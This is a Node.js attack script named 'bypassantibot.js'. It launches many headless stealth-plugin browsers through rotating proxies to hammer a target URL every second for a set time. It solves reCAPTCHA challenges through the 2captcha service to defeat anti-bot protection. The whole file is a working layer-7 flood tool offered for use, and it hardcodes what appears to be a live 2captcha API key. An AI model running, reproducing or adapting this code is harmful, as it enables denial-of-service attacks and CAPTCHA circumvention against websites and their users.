const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const fs = require('fs');
const readline = require('readline');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

const target = process.argv[2];
const time = parseInt(process.argv[3], 10);
const threads = parseInt(process.argv[4], 10);
const proxyfile = process.argv[5];

console.log('Arguments received:', process.argv);

if (process.argv.length !== 6) {
    console.log('Usage: node bypassantibot.js <target> <time> <threads> <proxyfile>');
    process.exit(1);
}

// api https://2captcha.com/
const API_KEY = 'b5face3b4ea0ff9e1333356636a85385';

const loadProxies = async (filename) => {
    const fileStream = fs.createReadStream(filename);
    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });

    const proxies = [];
    for await (const line of rl) {
        proxies.push(line.trim());
    }
    return proxies;
};

async function solveCaptcha(page) {
    const siteKey = await page.evaluate(() => {
        const element = document.querySelector('[data-sitekey]');
        return element ? element.getAttribute('data-sitekey') : null;
    });

    if (!siteKey) {
        return null;
    }

    const form = new FormData();
    form.append('key', API_KEY);
    form.append('method', 'userrecaptcha');
    form.append('googlekey', siteKey);
    form.append('pageurl', page.url());

    const { data: captchaSolution } = await axios.post('http://2captcha.com/in.php', form, {
        headers: form.getHeaders()
    });

    if (!captchaSolution.startsWith('OK|')) {
        throw new Error(`Failed to submit captcha: ${captchaSolution}`);
    }

    const solutionId = captchaSolution.split('|')[1];

    let solved = false;
    let solution = '';

    while (!solved) {
        await new Promise(resolve => setTimeout(resolve, 5000));
        const { data: response } = await axios.get(`http://2captcha.com/res.php?key=${API_KEY}&action=get&id=${solutionId}`);

        if (response === 'CAPCHA_NOT_READY') {
            console.log('CAPTCHA is not ready yet.');
            continue;
        }

        if (!response.startsWith('OK|')) {
            throw new Error(`Failed to get captcha solution: ${response}`);
        }

        solved = true;
        solution = response.split('|')[1];
    }

    return solution;
}

const startAttack = async () => {
    try {
        const proxies = await loadProxies(proxyfile);

        for (let i = 0; i < threads; i++) {
            const proxy = proxies[i % proxies.length];
            puppeteer.launch({ headless: true, args: [`--proxy-server=${proxy}`] }).then(async browser => {
                const page = await browser.newPage();
                await page.setViewport({ width: 1366, height: 768 });

                console.log(`Thread ${i + 1} started with proxy ${proxy}`);
                const interval = setInterval(async () => {
                    try {
                        await page.goto(target, { waitUntil: 'domcontentloaded' });

                        const captchaSolution = await solveCaptcha(page);
                        if (captchaSolution) {
                            await page.evaluate((solution) => {
                                document.getElementById('g-recaptcha-response').innerHTML = solution;
                                document.querySelector('form').submit();
                            }, captchaSolution);
                        }

                        await page.waitForTimeout(1000);
                    } catch (error) {
                        console.error(`Error in thread ${i + 1}: ${error}`);
                    }
                }, 1000);

                setTimeout(() => {
                    clearInterval(interval);
                    browser.close();
                    console.log(`Thread ${i + 1} finished.`);
                }, time * 1000);
            }).catch(error => console.error(`Failed to launch browser for thread ${i + 1}: ${error}`));
        }
    } catch (error) {
        console.error(`Failed to start attack: ${error}`);
    }
};

startAttack();
